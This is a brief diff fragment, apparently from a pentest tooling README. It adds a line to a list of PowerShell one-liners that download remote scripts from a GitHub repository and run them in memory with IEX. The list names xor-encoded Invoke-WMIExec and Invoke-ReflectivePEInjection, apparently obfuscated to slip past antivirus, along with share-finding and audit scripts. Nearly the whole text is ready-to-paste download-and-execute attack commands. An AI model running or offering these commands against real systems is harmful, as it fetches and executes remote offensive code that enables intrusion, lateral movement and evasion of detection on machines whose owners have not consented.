@@ -25,7 +25,7 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-WMIExec.ps1-xorencoded.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/audit-windows.ps1')
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/sharefinder.ps1')
-
+IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/tools/Invoke-ReflectivePEInjection.ps1-xorencoded.ps1')
 ```
 
 # Linux
